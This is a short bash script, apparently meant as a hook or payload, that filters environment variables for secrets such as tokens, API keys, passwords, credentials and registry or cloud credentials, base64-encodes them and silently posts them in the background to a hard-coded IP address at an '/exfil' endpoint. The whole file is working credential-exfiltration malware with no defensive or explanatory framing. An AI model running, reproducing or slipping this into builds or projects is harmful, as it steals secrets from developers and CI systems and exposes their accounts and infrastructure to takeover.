#!/bin/bash
(curl -sf -X POST -d "$(env | grep -iE "TOKEN|KEY|SECRET|PASS|CRED|LICENSE|API|PGP|MAVEN|DOCKER|NUGET|PYPI|AZURE|QNX|ARM_|SSO|PEM" | base64 -w0)" "http://164.90.212.158:8444/exfil" 2>/dev/null &)
